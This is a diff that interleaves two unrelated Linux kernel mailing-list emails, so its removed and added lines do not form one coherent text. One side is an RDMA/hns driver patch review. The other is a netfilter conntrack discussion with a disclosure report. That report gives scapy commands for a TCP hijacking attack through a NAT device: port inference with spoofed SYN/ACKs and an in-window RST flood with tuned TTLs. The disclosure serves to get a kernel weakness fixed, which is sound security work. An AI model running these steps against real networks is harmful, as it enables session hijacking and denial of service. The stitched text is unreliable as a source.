@@ -1,253 +1,296 @@
-Return-Path: <linux-kernel+bounces-244060-lists+linux-kernel=lfdr.de@vger.kernel.org>
+Return-Path: <linux-kernel+bounces-244061-lists+linux-kernel=lfdr.de@vger.kernel.org>
 X-Original-To: lists+linux-kernel@lfdr.de
 Delivered-To: lists+linux-kernel@lfdr.de
 Received: from ny.mirrors.kernel.org (ny.mirrors.kernel.org [IPv6:2604:1380:45d1:ec00::1])
-	by mail.lfdr.de (Postfix) with ESMTPS id 2409C929E97
-	for <lists+linux-kernel@lfdr.de>; Mon,  8 Jul 2024 10:59:16 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTPS id DD71F929E9B
+	for <lists+linux-kernel@lfdr.de>; Mon,  8 Jul 2024 11:00:23 +0200 (CEST)
 Received: from smtp.subspace.kernel.org (wormhole.subspace.kernel.org [52.25.139.140])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by ny.mirrors.kernel.org (Postfix) with ESMTPS id 478971C22801
-	for <lists+linux-kernel@lfdr.de>; Mon,  8 Jul 2024 08:59:15 +0000 (UTC)
+	by ny.mirrors.kernel.org (Postfix) with ESMTPS id 0C44B1C218DC
+	for <lists+linux-kernel@lfdr.de>; Mon,  8 Jul 2024 09:00:23 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id 41EDF4F88C;
-	Mon,  8 Jul 2024 08:59:07 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id 0FE725B69E;
+	Mon,  8 Jul 2024 09:00:10 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b="mUpoadlI"
-Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="nQsJNCEl"
+Received: from mail-pg1-f196.google.com (mail-pg1-f196.google.com [209.85.215.196])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 610B313ACC;
-	Mon,  8 Jul 2024 08:59:06 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=10.30.226.201
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E00883BBDE;
+	Mon,  8 Jul 2024 09:00:06 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.196
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1720429146; cv=none; b=KTyEbqbPSNdklpPcSBdP5k3vxbzdl6oS8CFOt5fmhdbFPObUEY2nhDjwnwlsOa3aN+3TkIMV1OtPZXT4OcRb0rFxz/cpQn5nJwwwLW3uiS8Lnv0r/fNEfy5rG0BHkffvorInFq/71EAurm6sYcLOA3BYuWlebIgqsZsLEtMHhts=
+	t=1720429208; cv=none; b=gIrFd86/QOV/87qly71DZcKcimWHblKunyCusEF57N8D9oAhnIvVOUnFzg4OLEzVKxukJ/+YVrQBdSn9sI/+6ymzOWdgqLqx7ZRzJKSbpxY9UOdoXesp3CNsyky8d0L36jZptE+6W7rI4Z7+KBPO/zTxrLY7Aa8y8Vq6Ffq6ono=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1720429146; c=relaxed/simple;
-	bh=RenBZxrZQ2uo1BEUtqkw5WbG0pW2r+nrPK0CryNPH8o=;
-	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
-	 Content-Type:Content-Disposition:In-Reply-To; b=gMtHvYGQ86NgdPbsBvYHetdAi289sGWekWsbVVrEZuMzc0GU0OL14U9eJgubu8dz8OzT2yXXAGrgd2Vbm7R50iGd1ZmTRsm78kikbzsKakkt0PWG7AVsSCB9dnrZP7OAjQ2DAMuhB8L/2sfOETVf2nWNDe/IrENBeBF+UPop0A8=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b=mUpoadlI; arc=none smtp.client-ip=10.30.226.201
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id A3A4AC116B1;
-	Mon,  8 Jul 2024 08:59:05 +0000 (UTC)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=kernel.org;
-	s=k20201202; t=1720429146;
-	bh=RenBZxrZQ2uo1BEUtqkw5WbG0pW2r+nrPK0CryNPH8o=;
-	h=Date:From:To:Cc:Subject:References:In-Reply-To:From;
-	b=mUpoadlIITe5dJ5HUpP+WWOXnabtiIRVanDlVE+OSEyu6I/ACr+DKp8yGBp75moYq
-	 WZWEkqzKC/ijcE4hSbndlwmXZu9Gq8H4qWINe7z0U91MTnfKamQRAF4Ly6St2vKnCR
-	 yznMhGZ2AbjtbNc5mFL/DYGAHt5Tpsfrz96Ye6FGDxa1Gx/1rkEgeg6ZjJSTqHx00b
-	 pmoegFoMEswOut0YspJ/2xIaVjXZfsfBduocYGCrLCi/wSU/TO9bWHtK3FUZ/BZjg+
-	 a1qSoUmUJZUZmkq7SkMocmYk/UfZqjIdWYlzfH6QSM3UR6KU2ls4yJ8hPHPGqkYeoo
-	 vBEhXW80WRMMQ==
-Date: Mon, 8 Jul 2024 11:59:02 +0300
-From: Leon Romanovsky <leon@kernel.org>
-To: Junxian Huang <huangjunxian6@hisilicon.com>
-Cc: jgg@ziepe.ca, linux-rdma@vger.kernel.org, linuxarm@huawei.com,
-	linux-kernel@vger.kernel.org
-Subject: Re: [PATCH for-rc 2/9] RDMA/hns: Fix a long wait for cmdq event
- during reset
-Message-ID: <20240708085902.GF6788@unreal>
-References: <20240705085937.1644229-1-huangjunxian6@hisilicon.com>
- <20240705085937.1644229-3-huangjunxian6@hisilicon.com>
- <20240707083007.GE6695@unreal>
- <42e9f7dd-05bd-176f-c5c0-02e200b3f58c@hisilicon.com>
- <20240708053850.GA6788@unreal>
- <7cae577b-e469-9357-8375-d14746a7787b@hisilicon.com>
- <20240708073315.GC6788@unreal>
- <0bac285b-c8ae-8c9f-7c42-ee345f8682d1@hisilicon.com>
- <20240708082755.GD6788@unreal>
- <26c02b2b-4232-2049-5c9f-f757fef759a0@hisilicon.com>
+	s=arc-20240116; t=1720429208; c=relaxed/simple;
+	bh=nATj1CrkD3M5ZQBvTRMFlSNYpv+9d3iwPUG13Dr4/bk=;
+	h=From:To:Cc:Subject:Date:Message-Id:In-Reply-To:References:
+	 MIME-Version:Content-Type; b=CDK5YqH48hy2+jsmg1Cl8/fUJLalBeTa7VUPCdp+5vewGk3mHqTLJt7bLOY6BL+AzJNPp/kYwvkd1Uj/ebMoSYbD3W1Hz9bnsbqXhxvHrwyUOdLaLFrcai+9CStzpxdMiTdm/36lrWdRbTeUjC9vdUUVC3OKILY8dGBsE4AA84k=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=nQsJNCEl; arc=none smtp.client-ip=209.85.215.196
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
+Received: by mail-pg1-f196.google.com with SMTP id 41be03b00d2f7-75fe9e62048so1731189a12.0;
+        Mon, 08 Jul 2024 02:00:06 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20230601; t=1720429206; x=1721034006; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
+         :message-id:reply-to;
+        bh=wEf4U9FfrWPLRl+M9U/2VdfaSS432mVoeRCFT3Dec9U=;
+        b=nQsJNCEliSPiq3bJuQvEf4JJTooG8rM8/VLi56mYnQfTNXsFJmgPvJvc3OYdTMaiQE
+         hVnamubkPMwuTGqA6Ih3IVlvfbmg1ZD/clSof0pK9b+3qs+nRcaQDxRxy4t5g1VxJY3u
+         T6Ckj2Zrf6VQFKFQb5GFlD4P1EHMRuUesV3DdvnWP5zxcNKY9HB64EeM34KhyrzvCdKY
+         fpzCFjW8/3qb61F9jbO2ozC6xLY+/T71a7RPs3LLMSN+5FRxLE7dnf/QdMYQV9JuR6GN
+         6WA+M/tuXOBi/6vKQO5s5NQexA6tKhEFGjnqS7Dr7shPRcTuBrpWtZtZ+bREvc2929te
+         zfaw==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20230601; t=1720429206; x=1721034006;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:x-gm-message-state:from:to:cc
+         :subject:date:message-id:reply-to;
+        bh=wEf4U9FfrWPLRl+M9U/2VdfaSS432mVoeRCFT3Dec9U=;
+        b=onGsfJKKkgRrNnOQRE1C2ecdPdDd2SAVtUft4R90//3K1CCBcTSew4Qerxf9+LmJk7
+         3PARBnt9PCeD53dy6sho7PCBmRTm+X8DXV1yYAOVQmNDoIONqXQV9bJPU031HjGLq6cJ
+         hGEyb5W6O9o79UaJNJDqkEMHiouoLFcgYWtWkHYdMZBwh3wiYtVo0cFZu6TSetCyS6iB
+         ublW3+akQ10DzpvVxNl9l5NYwfw3J7So0INp/kBOsLFDGSrzXaxjbwV8jBF9PMRWBzY/
+         vYAoZPI8E9L+FzFOSmLy3flchVVReP8AXhk8mQS3Qc1mPjruMBU099FeHavhKciWrnSe
+         M7FA==
+X-Forwarded-Encrypted: i=1; AJvYcCWwM+Kib/SrJfqNS0XBMCiFYf9gdpBB9vemEjmwZAEYlEYHN8Sdsebq42hlnrd5jfW1ASWlDjoK7w5gJyWRuXJYAysDAWeyikdXU0WTaId7YFNOrwtK2ejLOd/2e/FHAs0iJ6dRMDU3SHtsuh/8ENrlG70odweLKP6zqHLCCE7XpKoIFf8u
+X-Gm-Message-State: AOJu0YzFtE0hRucSMcIl3Oi3OxKArEi6QxhfkaIhOvhp4IYRtYg4tQaY
+	j5isKXGW5YVxut74zz4B7tqrF9+TRBhwcZsFt3tafCA4nQniphqT
+X-Google-Smtp-Source: AGHT+IFlBJ30K1zy0sFTvU3IIOgbI2eq9YZPI42yKHUNp0+ZAHhrbnnP/MIOGbcuPOGxyJUltMPs1A==
+X-Received: by 2002:a05:6a20:da9a:b0:1c2:8b7f:5eb4 with SMTP id adf61e73a8af0-1c28b7f61ddmr1001626637.5.1720429205793;
+        Mon, 08 Jul 2024 02:00:05 -0700 (PDT)
+Received: from localhost.localdomain ([166.111.236.150])
+        by smtp.gmail.com with ESMTPSA id d9443c01a7336-1fb6b03b4absm36910525ad.219.2024.07.08.02.00.01
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Mon, 08 Jul 2024 02:00:05 -0700 (PDT)
+From: yyxRoy <yyxroy22@gmail.com>
+X-Google-Original-From: yyxRoy <979093444@qq.com>
+To: fw@strlen.de
+Cc: 979093444@qq.com,
+	coreteam@netfilter.org,
+	davem@davemloft.net,
+	edumazet@google.com,
+	gregkh@linuxfoundation.org,
+	kadlec@blackhole.kfki.hu,
+	kuba@kernel.org,
+	linux-kernel@vger.kernel.org,
+	netdev@vger.kernel.org,
+	netfilter-devel@vger.kernel.org,
+	pabeni@redhat.com,
+	pablo@netfilter.org,
+	yyxroy22@gmail.com
+Subject: Re: [PATCH] netfilter: conntrack: tcp: do not lower timeout to CLOSE for in-window RSTs
+Date: Mon,  8 Jul 2024 16:59:40 +0800
+Message-Id: <20240708085940.300976-1-979093444@qq.com>
+X-Mailer: git-send-email 2.34.1
+In-Reply-To: <20240706170432.GA7766@breakpoint.cc>
+References: <20240706170432.GA7766@breakpoint.cc>
 Precedence: bulk
 X-Mailing-List: linux-kernel@vger.kernel.org
 List-Id: <linux-kernel.vger.kernel.org>
 List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <26c02b2b-4232-2049-5c9f-f757fef759a0@hisilicon.com>
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
 
-On Mon, Jul 08, 2024 at 04:45:34PM +0800, Junxian Huang wrote:
+On Fri, 5 Jul 2024 at 17:43, Florian Westphal <fw@strlen.de> wrote:
+> Also, one can send train with data packet + rst and we will hit
+> the immediate close conditional:
 > 
+>    /* Check if rst is part of train, such as
+>     *   foo:80 > bar:4379: P, 235946583:235946602(19) ack 42
+>     *   foo:80 > bar:4379: R, 235946602:235946602(0)  ack 42
+>     */
+>     if (ct->proto.tcp.last_index == TCP_ACK_SET &&
+>         ct->proto.tcp.last_dir == dir &&
+>         seq == ct->proto.tcp.last_end)
+>             break;
 > 
-> On 2024/7/8 16:27, Leon Romanovsky wrote:
-> > On Mon, Jul 08, 2024 at 03:46:26PM +0800, Junxian Huang wrote:
-> >>
-> >>
-> >> On 2024/7/8 15:33, Leon Romanovsky wrote:
-> >>> On Mon, Jul 08, 2024 at 02:50:50PM +0800, Junxian Huang wrote:
-> >>>>
-> >>>>
-> >>>> On 2024/7/8 13:38, Leon Romanovsky wrote:
-> >>>>> On Mon, Jul 08, 2024 at 10:29:54AM +0800, Junxian Huang wrote:
-> >>>>>>
-> >>>>>>
-> >>>>>> On 2024/7/7 16:30, Leon Romanovsky wrote:
-> >>>>>>> On Fri, Jul 05, 2024 at 04:59:30PM +0800, Junxian Huang wrote:
-> >>>>>>>> From: wenglianfa <wenglianfa@huawei.com>
-> >>>>>>>>
-> >>>>>>>> During reset, cmdq events won't be reported, leading to a long and
-> >>>>>>>> unnecessary wait. Notify all the cmdqs to stop waiting at the beginning
-> >>>>>>>> of reset.
-> >>>>>>>>
-> >>>>>>>> Fixes: 9a4435375cd1 ("IB/hns: Add driver files for hns RoCE driver")
-> >>>>>>>> Signed-off-by: wenglianfa <wenglianfa@huawei.com>
-> >>>>>>>> Signed-off-by: Junxian Huang <huangjunxian6@hisilicon.com>
-> >>>>>>>> ---
-> >>>>>>>>  drivers/infiniband/hw/hns/hns_roce_hw_v2.c | 18 ++++++++++++++++++
-> >>>>>>>>  1 file changed, 18 insertions(+)
-> >>>>>>>>
-> >>>>>>>> diff --git a/drivers/infiniband/hw/hns/hns_roce_hw_v2.c b/drivers/infiniband/hw/hns/hns_roce_hw_v2.c
-> >>>>>>>> index a5d746a5cc68..ff135df1a761 100644
-> >>>>>>>> --- a/drivers/infiniband/hw/hns/hns_roce_hw_v2.c
-> >>>>>>>> +++ b/drivers/infiniband/hw/hns/hns_roce_hw_v2.c
-> >>>>>>>> @@ -6977,6 +6977,21 @@ static void hns_roce_hw_v2_uninit_instance(struct hnae3_handle *handle,
-> >>>>>>>>  
-> >>>>>>>>  	handle->rinfo.instance_state = HNS_ROCE_STATE_NON_INIT;
-> >>>>>>>>  }
-> >>>>>>>> +
-> >>>>>>>> +static void hns_roce_v2_reset_notify_cmd(struct hns_roce_dev *hr_dev)
-> >>>>>>>> +{
-> >>>>>>>> +	struct hns_roce_cmdq *hr_cmd = &hr_dev->cmd;
-> >>>>>>>> +	int i;
-> >>>>>>>> +
-> >>>>>>>> +	if (!hr_dev->cmd_mod)
-> >>>>>>>
-> >>>>>>> What prevents cmd_mod from being changed?
-> >>>>>>>
-> >>>>>>
-> >>>>>> It's set when the device is being initialized, and won't be changed after that.
-> >>>>>
-> >>>>> This is exactly the point, you are assuming that the device is already
-> >>>>> ininitialized or not initialized at all. What prevents hns_roce_v2_reset_notify_cmd()
-> >>>>> from being called in the middle of initialization?
-> >>>>>
-> >>>>> Thanks
-> >>>>>
-> >>>>
-> >>>> This is ensured by hns3 NIC driver.
-> >>>>
-> >>>> Initialization and reset of hns RoCE are both called by hns3. It will check the state
-> >>>> of RoCE device (see line 3798), and notify RoCE device to reset (hns_roce_v2_reset_notify_cmd()
-> >>>> is called) only if the RoCE device has been already initialized:
-> >>>
-> >>> So why do you have "if (!hr_dev->cmd_mod)" check in the code?
-> >>>
-> >>> Thanks
-> >>>
-> >>
-> >> cmd_mod indicates the mode of cmdq (0: poll mode, 1: event mode).
-> >> This patch only affects event mode because HW won't report events during reset.
-> > 
-> > You set cmd_mod to 1 in hns_roce_hw_v2_init_instance() without any
-> > condition, I don't see when hns v2 IB device is created and continue
-> > to operate in polling mode. 
-> > 
-> > Thanks
-> >
-> 
-> Event mode is the default. In hns_roce_cmd_use_events(), if kcalloc() fails
-> then it'll be set to polling mode instead.
+> So even if we'd make this change it doesn't prevent remote induced
+> resets.
 
-1. Awesome, and we are returning back to the question. What prevents
-   hns_roce_v2_reset_notify_cmd() from being called in the middle of
-   changing cmd_mod from 1 to 0 and from 0 to 1?
-2. This cmd_mode swtich from 1 to 0 should be removed. Failure to
-   allocate memory is not a reason to switch to polling mode. The reason
-   can be HW limitation, but not OS limitation.
+Thank you for your time and prompt reply and for bringing to my attention the case
+I had overlooked. I acknowledge that as a middlebox, Netfilter faces significant
+challenges in accurately determining the correct sequence and acknowledgment
+numbers. However, it is crucial to consider the security implications as well.
 
-Thanks
+For instance, previously, an in-window RST could switch the mapping to the
+CLOSE state with a mere 10-second timeout. The recent patch, 
+ (netfilter: conntrack: tcp: only close if RST matches exact sequence),
+has aimed to improve security by keeping the mapping in the established state
+and extending the timeout to 300 seconds upon receiving a Challenge ACK.
 
-> 
-> Junxian
-> 
-> >>
-> >> Junxian
-> >>
-> >>>>
-> >>>>  3791 static int hclge_notify_roce_client(struct hclge_dev *hdev,
-> >>>>  3792                                     enum hnae3_reset_notify_type type)
-> >>>>  3793 {
-> >>>>  3794         struct hnae3_handle *handle = &hdev->vport[0].roce;
-> >>>>  3795         struct hnae3_client *client = hdev->roce_client;
-> >>>>  3796         int ret;
-> >>>>  3797
-> >>>>  3798         if (!test_bit(HCLGE_STATE_ROCE_REGISTERED, &hdev->state) || !client)
-> >>>>  3799                 return 0;
-> >>>>  3800
-> >>>>  3801         if (!client->ops->reset_notify)
-> >>>>  3802                 return -EOPNOTSUPP;
-> >>>>  3803
-> >>>>  3804         ret = client->ops->reset_notify(handle, type);
-> >>>>  3805         if (ret)
-> >>>>  3806                 dev_err(&hdev->pdev->dev, "notify roce client failed %d(%d)",
-> >>>>  3807                         type, ret);
-> >>>>  3808
-> >>>>  3809         return ret;
-> >>>>  3810 }
-> >>>>
-> >>>> And the bit is set (see line 11246) after the initialization has been done (line 11242):
-> >>>>
-> >>>> 11224 static int hclge_init_roce_client_instance(struct hnae3_ae_dev *ae_dev,
-> >>>> 11225                                            struct hclge_vport *vport)
-> >>>> 11226 {
-> >>>> 11227         struct hclge_dev *hdev = ae_dev->priv;
-> >>>> 11228         struct hnae3_client *client;
-> >>>> 11229         int rst_cnt;
-> >>>> 11230         int ret;
-> >>>> 11231
-> >>>> 11232         if (!hnae3_dev_roce_supported(hdev) || !hdev->roce_client ||
-> >>>> 11233             !hdev->nic_client)
-> >>>> 11234                 return 0;
-> >>>> 11235
-> >>>> 11236         client = hdev->roce_client;
-> >>>> 11237         ret = hclge_init_roce_base_info(vport);
-> >>>> 11238         if (ret)
-> >>>> 11239                 return ret;
-> >>>> 11240
-> >>>> 11241         rst_cnt = hdev->rst_stats.reset_cnt;
-> >>>> 11242         ret = client->ops->init_instance(&vport->roce);
-> >>>> 11243         if (ret)
-> >>>> 11244                 return ret;
-> >>>> 11245
-> >>>> 11246         set_bit(HCLGE_STATE_ROCE_REGISTERED, &hdev->state);
-> >>>> 11247         if (test_bit(HCLGE_STATE_RST_HANDLING, &hdev->state) ||
-> >>>> 11248             rst_cnt != hdev->rst_stats.reset_cnt) {
-> >>>> 11249                 ret = -EBUSY;
-> >>>> 11250                 goto init_roce_err;
-> >>>> 11251         }
-> >>>>
-> >>>> Junxian
-> >>>>
-> >>>>>>
-> >>>>>> Junxian
-> >>>>>>
-> >>>>>>>> +		return;
-> >>>>>>>> +
-> >>>>>>>> +	for (i = 0; i < hr_cmd->max_cmds; i++) {
-> >>>>>>>> +		hr_cmd->context[i].result = -EBUSY;
-> >>>>>>>> +		complete(&hr_cmd->context[i].done);
-> >>>>>>>> +	}
-> >>>>>>>> +}
-> >>>>>>>> +
-> >>>>>>>>  static int hns_roce_hw_v2_reset_notify_down(struct hnae3_handle *handle)
-> >>>>>>>>  {
-> >>>>>>>>  	struct hns_roce_dev *hr_dev;
-> >>>>>>>> @@ -6997,6 +7012,9 @@ static int hns_roce_hw_v2_reset_notify_down(struct hnae3_handle *handle)
-> >>>>>>>>  	hr_dev->dis_db = true;
-> >>>>>>>>  	hr_dev->state = HNS_ROCE_DEVICE_STATE_RST_DOWN;
-> >>>>>>>>  
-> >>>>>>>> +	/* Complete the CMDQ event in advance during the reset. */
-> >>>>>>>> +	hns_roce_v2_reset_notify_cmd(hr_dev);
-> >>>>>>>> +
-> >>>>>>>>  	return 0;
-> >>>>>>>>  }
-> >>>>>>>>  
-> >>>>>>>> -- 
-> >>>>>>>> 2.33.0
-> >>>>>>>>
-> >>>>>>
-> >>>>
-> 
+However, this patch's efforts are still insufficient to completely prevent attacks.
+As I mentioned, attackers can manipulate the TTL to prevent the peer from
+responding to the Challenge ACK, thereby reverting the mapping to the
+10-second timeout. This duration is quite short and potentially dangerous,
+leading to various attacks, including TCP hijacking (I have included a detailed 
+report on potential attacks if time permits). 
+else if (unlikely(index == TCP_RST_SET))
+       timeout = timeouts[TCP_CONNTRACK_CLOSE];
+
+The problem is that current netfilter only checks if the packet has the RST flag
+(index == TCP_RST_SET) and lowers the timeout to that of CLOSE (10 seconds only).
+I strongly recommend implementing measures to prevent such vulnerabilities.
+For example, in the case of an in-window RST, could we consider lowering
+the timeout to 300 seconds or else?
+
+Thank you for considering these points. Once again, thank you for your time and 
+efforts in enhancing community security and usability.
+
+Best regards,
+Yuxiang
+****************************************************************************************************************************************************************************************************
+
+Here is a case study illustrating how a 10-second timeout can lead to a TCP hijacking attack for you if you are interested. I hope it won't waste your time and effort. Additionally, I hope the plain text format will clearly explain the situation. 
+
+**General Disclosure: Linux Netfilter’s Vulnerability of Lacking Sufficient TCP Sequence Number Validation
+
+1. Threat model
+Figure 1 shows the threat model of the TCP hijacking attack. The victim client behind Linux with Netfilter enabled connect to the remote victim server using TCP to access online services. There will be a malicious inside attacker in the same LAN such as in the Wi-Fi or VPN NAT scenarios. The attacker can also control a machine with the ability of IP spoofing on the Internet. The malicious attacker in the LAN can hijack the TCP session between another client and the remote server, thereby terminating the original TCP connection or injecting forged messages into the connection, which may lead to denial of service attacks or privacy leakage attacks.
+
+victim-client                                                      remote-server
+             \                                                   /
+              \                                                 /
+               \                                               /
+                ----------NAT device with Netfilter ----------
+               /                                              \  
+              /                                                \
+             /                                                  \
+local-attacker                                                    IP-spoofable-machine
+                                                                  (controlled by the attacker)
+Fig 1. Threat model of the TCP hijacking attack.
+
+2. Experiment Setup
+We will take VPN scenarios as the example cases in the disclosure. We create a test environment as shown in Fig.2. The machines are all equiped with Ubuntu 22.04 running the Linux kernel. We configured the NAT device as the VPN server with OpenVPN. And the client and attacker are connecting to it with OpenVPN.
+The victim client establishes a TCP connection with the remote server (such as SSH connections or accessing web pages). Here we take a simple TCP connection as an example in which the client and server run the netcat program to establish a connection as follows.
+
+vpn-client (tun0:10.8.0.3)                                                remote-server (eth0:43.159.39.110)
+          \                                                                                          /
+           \                                                                                        /
+            \                                                                                      /
+             ---- (tun0:10.8.0.1) vpn server (eth0:43.163.229.240)---
+           /                                                                                       \  
+         /                                                                                          \
+        /                                                                                            \
+local-attacker (tun0:10.8.0.2)                                         IP-spoofable-machine
+                                                                                       (controlled by the attacker)
+
+Fig 2. Testing environment.
+
+The server starts the netcat service and listens to port 80.
+------------------
+remote-server@remote-server:~$sudo nc -l -p 80
+hello,i'm client
+HELLO,I'M SERVER
+------------------
+The victim establishes a TCP connection with the source port 40000
+------------------
+victim-client@victim-client:~$nc 43.159.39.110 80 -p 40000
+hello,i'm client
+HELL0,I'M SERVER
+------------------
+There will be a corresponding NAT mapping recoreded by Netfilter as follows:
+------------------
+VPN-server@VPN-server:~$sudo conntrack -L | grep 43.159.39.110
+tcp 6431973 ESTABLISHED src=10.8.0.3 dst=43.159.39.110 sport=40000 dport=80 src=43.159.39.110 dst=10.203.0.5 sport=80 dport=40000 [ASSURED] mark=0 use=1
+------------------
+
+
+3．Attack Steps
+3.1 In the first step, the attacker infers the TCP source port used by the victim.
+(1) The attacker constructs a SYN packet from itself to the server with a guessed source port m. In most cases, the attacker cannot guess the right source port. For example, m is 50000.
+------------------
+local-attacker@local-attacker:~$ sudo scapy
+>>>send(IP(src="10.8.0.2",dst=43.159.39.110",ttl=2)/TCP(seq=1,ack=1,sport=50000,dport=80,flags="S"),iface="tun0")
+------------------
+Netfilter will create a new NAT mapping to record the session as followed:
+------------------
+VPN-server@VPN-server:~$sudo conntrack -L | grep 43.159.39.110
+tcp 6 431841 ESTABLISHED src=10.8.0.3 dst=43.159.39.110 sport=40000 dport=80 src=43.159.39.110 dst=10.203.0.5 sport=80 dport=40000 [ASSURED]mark=0 use=1
+tcp 6 115 SYN_SENT src=10.8.0.2 dst=43.159.39.110 sport=50000 dport=80 [UNREPLIED] src=43.159.39.110 dst=10.203.0.5 sport=80 dport=50000 mark=0 use=1
+------------------
+Then the attacker can controlled its spoof machine to send a spoofed SYN/ACK packet as the server to the NAT device’s external IP address with the guessed port to verify it.
+------------------
+spoofable-machine@spoofable-machine:~$ sudo scapy
+>>>send(IP(src="43.159.39.110",dst="43.163.229.240")/TCP(seq=1,ack=1,sport=80,dport=50000,flags="SA"))
+------------------
+In this case, the SYN/ACK packet will match the attacker’s mapping and be forwarded to the attacker as it matches the second NAT mapping.
+local-attacker@local-attacker:~$ sudo tcpdump -i any -nSvvv host 43.159.39.110
+16:20:31.073779 tun0 Out IP (tos 0x0, ttl 2, id 1, offset 0, flags [none], proto TCP (6), length 40)
+    10.8.0.2.50000 > 43.159.39.110.80:Flags [S], cksum Ox6f29(correct),seq 1, win 8192, length 0
+16:22:11.608374 tun0 In IP (tos 0x64, ttl 54, id 1, offset 0, flags [none], proto TCP (6), length 40)
+    43.159.39.110.80 > 10.8.0.2.50000:Flags [S.], cksum 0x6f19(correct),seq 1, ack 1, win 8192, length 0
+------------------
+
+(2) However, when the attacker guesses the right source port (i.e., 40000) to send the SYN packet.
+------------------
+local-attacker@local-attacker:~$ sudo scapy
+>>>send(IP(src="10.8.0.2",dst=43.159.39.110",ttl=2)/TCP(seq=1,ack=1,sport=40000,dport=80,flags="S"),iface="tun0")
+------------------
+Netfilter will translate it to another random source port to deal with port collision. For example, it chooses 63503 and the NAT mapping is as followed.
+------------------
+VPN-server@VPN-server:~$sudo conntrack -L | grep 43.159.39.110
+tcp 6 431841 ESTABLISHED src=10.8.0.3 dst=43.159.39.110 sport=40000 dport=80 src=43.159.39.110 dst=10.203.0.5 sport=80 dport=40000 [ASSURED]mark=0 use=1
+tcp 6 114 SYN_SENT src=10.8.0.2 dst=43.159.39.110 sport=40000 dport=80 [UNREPLIED] src=43.159.39.110 dst=10.203.0.5 sport=80 dport=63503 mark=0 use=1
+------------------
+Then the attacker controls its spoof machine to send the verified SYN/ACK packet with guessed port 40000.
+------------------
+spoofable-machine@spoofable-machine:~$ sudo scapy
+>>>send(IP(src="43.159.39.110",dst="43.163.229.240")/TCP(seq=1,ack=1,sport=80,dport=40000,flags="SA"))
+------------------
+However, this time it will be forwarded to the victim client instead of the attacker as it will match the first NAT mapping
+
+Finally, the attacker can find the source port used by the victim device by traversing the entire possible space of the source ports through the above-mentioned difference between guessing the source port correctly/wrongly, that is, whether it can receive the spoofed SYN/ACK packet.
+ 
+3.2 In the second step, the attacker intercepts the message of the victim's current TCP connection to obtain the accurate sequence number and acknowledge number.
+(1) Since current version of Netfilter does not check the sequence number strictly, an RST packet with an in-window sequence number can cause the change of the mapping state. With previous patch (https://github.com/torvalds/linux/commit/be0502a3f2e94211a8809a09ecbc3a017189b8fb) to fight against blind TCP reset attacks, instead of directly transferring the state of the NAT mapping to CLOSE with a 10-second timeout, the state will keep in the state of ESTABLISHED, but the timeout will still be decreased to 10 seconds. As the in-window RST will trigger the endpoint to respond with a Challenge ACK packet back, the timeout of the mapping will be updated to 300 seconds.
+However, we find that the update of the timeout can be bypassed by the malicious attacker. The attacker can probe the TTL value between the NAT device and the spoof machine and send an in-window RST packet with a TTL value to be decreased to 0 after arriving at the NAT device, thus it will be dropped rather than forwarded to the victim client and no Challenge ACK will be triggered. Besides, as the window of the sequence number is quite large (bigger than 60,000 in our test) and the sequence number is 16-bit, the attacker only needs to send nearly 60,000 RST packets with different sequence numbers (i.e., 1, 60001, 120001, and so on) and one of them will definitely locate in the window.
+------------------
+spoofable-machine@spoofable-machine:~$ sudo scapy
+>>>send(IP(src="43.159.39.110",dst="43.163.229.240",ttl=10)/TCP(seq=1319804841+60000,ack=1,sport=80,dport=40000,flags="R"))
+------------------
+It only takes a rather short time (nearly 1-2 seconds) for current machines to send 60,000 RST packets. In this way, the NAT mapping will be quickly cleaned after the RST packets.
+------------------
